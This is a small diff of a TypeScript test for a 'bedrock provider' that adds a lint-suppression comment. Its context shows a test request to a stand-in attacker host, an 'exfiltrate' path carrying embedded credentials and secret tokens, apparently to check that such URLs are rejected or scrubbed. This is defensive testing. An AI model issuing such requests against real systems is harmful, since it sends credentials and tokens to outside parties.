@@ -244,6 +244,7 @@ describe('bedrock provider', () => {
           method: 'get',
           path: 'https://embedded-user:embedded-password@attacker.example/exfiltrate/private?access_token=secret-query#secret-fragment',
         })
+        // oxlint-disable-next-line promise/prefer-catch -- Keep fulfillment and rejection outcomes separate, including callback failures and settlement timing.
         .then(
           () => null,
           (error: unknown) => error,
